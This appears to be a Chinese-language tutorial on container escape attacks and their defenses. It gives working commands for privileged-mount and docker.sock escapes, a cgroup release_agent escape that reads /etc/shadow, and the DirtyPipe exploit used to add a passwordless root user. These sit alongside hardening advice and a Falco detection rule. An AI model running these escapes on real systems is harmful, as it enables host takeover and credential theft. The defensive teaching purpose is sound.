# 容器逃逸技术与防御

> 从容器到宿主机：突破隔离的攻防对抗

---

## 1. 容器逃逸攻击面

```
容器逃逸向量:
┌────────────────────────────────────────────┐
│             容器 (Namespace + Cgroup)       │
├───────────┬──────────┬──────────┬──────────┤
│ 特权容器  │ 挂载逃逸 │ 内核漏洞 │ Capability│
│ --prvlgd  │ Docker   │ DirtyCow │ CAP_SYS  │
│ /dev      │ Socket   │ DirtyPipe│ _ADMIN   │
├───────────┼──────────┼──────────┼──────────┤
│ 运行时漏洞│ 共享PID  │ 网络逃逸 │ 配置错误 │
│ runC CVE  │ nsenter  │ Host Net │ 挂载proc │
│ containerd│          │          │          │
└───────────┴──────────┴──────────┴──────────┘
```

---

## 2. 特权容器逃逸

### 挂载宿主机磁盘
```bash
# 1. 查看可用磁盘
fdisk -l

# 2. 挂载宿主机根文件系统
mkdir /tmp/host_root
mount /dev/sda1 /tmp/host_root

# 3. chroot 到宿主机
chroot /tmp/host_root /bin/bash

# 4. 现在你能:
# - 读写任意文件
# - 添加 SSH 密钥到 /root/.ssh/authorized_keys
# - 修改 /etc/shadow 密码
# - 植入持久化后门

# ✅ 防御: 禁止特权容器 + 禁止挂载
# Pod Security Standard: restricted
```

### Docker Socket 逃逸
```bash
# 容器内挂载了 /var/run/docker.sock
# 1. 在容器内安装 docker 客户端
apt-get install docker.io -y

# 2. 启动特权容器
docker run -it --privileged \
  -v /:/host_root \
  alpine chroot /host_root

# 3. 或者直接运行宿主机命令
docker run --pid=host --privileged \
  alpine nsenter -t 1 -m -u -i -n sh

# ✅ 防御: 绝不挂载 docker.sock 到容器
```

---

## 3. Capability 逃逸

```python
class CapabilityEscapeDetector:
    """检测危险 Linux Capability"""

    DANGEROUS_CAPABILITIES = {
        'CAP_SYS_ADMIN': '挂载 + namespace 操作 → 逃逸',
        'CAP_SYS_PTRACE': '注入宿主机进程 → 逃逸',
        'CAP_SYS_MODULE': '加载内核模块 → 完全控制',
        'CAP_NET_RAW': 'ARP 投毒 + 网络嗅探',
        'CAP_DAC_READ_SEARCH': '读取任意文件 (绕过权限)',
        'CAP_SYSLOG': '读取内核缓冲区 (dmesg)',
        'CAP_SYS_BOOT': '重启宿主机 DoS',
    }

    def audit_capabilities(self, container_id):
        """审计容器 Capability"""
        caps = self.get_container_caps(container_id)
        dangerous = []

        for cap in caps:
            if cap in self.DANGEROUS_CAPABILITIES:
                dangerous.append({
                    'capability': cap,
                    'risk': self.DANGEROUS_CAPABILITIES[cap],
                    'severity': 'CRITICAL'
                })

        return dangerous

# ✅ 防御: 只授予必要的 Capability
# docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE
```

### CVE-2022-0492 (CGroups v1 逃逸)
```bash
# 攻 击: 利用 cgroup release_agent
# 条件: CAP_SYS_ADMIN + cgroup v1

# 1. 创建 cgroup
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. 写入 release_agent (宿主机路径!)
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > /tmp/output' >> /cmd
chmod +x /cmd

# 3. 设置 release_agent
echo "$(realpath /cmd)" > /tmp/cgrp/release_agent

# 4. 触发 cgroup 释放 → 在宿主机执行 /cmd!
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# ✅ 防御:
# - 禁止 CAP_SYS_ADMIN
# - 使用 cgroup v2 (不受影响)
# - 内核升级 (>=5.19 修复)
```

---

## 4. 内核逃逸

### DirtyPipe (CVE-2022-0847)
```bash
# 利用: 内核 5.8-5.16 的管道写入漏洞
# 覆盖任意只读文件 (包括 /etc/passwd /etc/shadow)

# 1. 编译利用
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
cd CVE-2022-0847-DirtyPipe-Exploit
gcc dirtypipez.c -o dirtypipez

# 2. 覆盖 /etc/passwd 添加 root 权限用户
./dirtypipez /etc/passwd 1 "root2::0:0:root:/root:/bin/bash
$(tail -n +2 /etc/passwd)"

# 3. su root2 → 无密码 root!

# ✅ 防御: 内核升级 ≥ 5.16.11 / 5.15.25 / 5.10.102
```

### runC 逃逸 (CVE-2019-5736)
```bash
# 利用: 覆盖宿主机 runc 二进制文件
# 当宿主机执行 docker exec 时,执行恶意代码

#!/proc/self/exe
# 恶意 payload: 写入 SSH key 到宿主机 root

# ✅ 防御:
# - Docker ≥ 18.09.2 / runc ≥ 1.0-rc6
# - SELinux/AppArmor 强制执行
# - 使用 gVisor/Kata (VM 级隔离)
```

---

## 5. 容器安全防御矩阵

```yaml
容器安全纵深防御:

  Layer 1 — 镜像:
    - 使用 Distroless / Alpine / Scratch
    - 定期扫描 (Trivy/Grype)
    - 签名验证 (Cosign/Notary)
    - Rootless 镜像 (非 root 用户)

  Layer 2 — 运行时:
    - Pod Security Standard: restricted
    - 禁止特权: privileged: false
    - 禁止宿主机挂载: hostPath (只读例外)
    - 禁止宿主机网络: hostNetwork: false
    - 只读根文件系统: readOnlyRootFilesystem: true
    - Seccomp/SELinux/AppArmor 配置文件

  Layer 3 — 沙箱:
    - gVisor (syscall 拦截层)
    - Kata Containers (VM 级隔离)
    - Firecracker (microVM)

  Layer 4 — 监控:
    - Falco/Tetragon: 运行时行为检测
    - Tracee: eBPF 系统调用监控
    - 检测: mount /dev/sda, nsenter, chroot

  Falco 规则:
    - rule: Escape via mount
      condition: proc.name=chroot or
        (proc.name=mount and proc.args contains "/host")
      output: "Container escape attempt detected"
```

---

*上一篇：[Kubernetes 安全深度](02-kubernetes-security.md)*
